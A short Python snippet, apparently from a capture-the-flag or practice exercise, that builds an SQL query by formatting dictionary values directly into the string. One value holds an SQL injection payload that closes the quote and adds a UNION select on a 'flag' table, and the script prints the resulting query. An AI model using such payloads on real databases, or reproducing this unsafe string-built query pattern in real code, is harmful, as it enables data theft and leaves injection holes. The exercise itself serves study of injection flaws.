
prefs = {'dad' : 'fda\' UNION select * from flag;'}



query= """
    select * from users where {} LIMIT 25;
    """.format(
        " AND ".join(["{} = '{}'".format(k, v) for k, v in prefs.items()])
    )
print(query)